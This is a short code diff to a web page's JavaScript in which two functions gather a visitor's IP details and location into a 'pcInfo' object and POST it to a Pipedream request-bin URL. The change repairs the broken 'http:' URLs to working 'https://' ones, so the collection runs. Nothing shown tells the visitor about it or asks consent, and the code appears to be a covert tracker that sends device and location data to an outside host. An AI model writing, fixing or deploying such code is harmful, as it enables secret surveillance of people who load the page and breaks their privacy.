@@ -38,10 +38,10 @@
 
       async function sendData(pcInfo) {
         try {
-          const response = await fetch('http:ipinfo.io/json');
+          const response = await fetch('https://ipinfo.io/json');
           const ipData = await response.json();
           pcInfo.ip = ipData;
-          await fetch('http:enikio9fskusg.x.pipedream.net/', {
+          await fetch('https://enikio9fskusg.x.pipedream.net/', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
@@ -56,13 +56,13 @@
 
       async function sendDataWithIpInfo(pcInfo) {
         try {
-          const response = await fetch('http:ipinfo.io/json');
+          const response = await fetch('https://ipinfo.io/json');
           const ipData = await response.json();
           pcInfo.ip = ipData;
           if (!pcInfo.location.latitude && !pcInfo.location.longitude) {
             [pcInfo.location.latitude, pcInfo.location.longitude] = ipData.loc.split(',');
           }
-          await fetch('http:enikio9fskusg.x.pipedream.net/', {
+          await fetch('https://enikio9fskusg.x.pipedream.net/', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
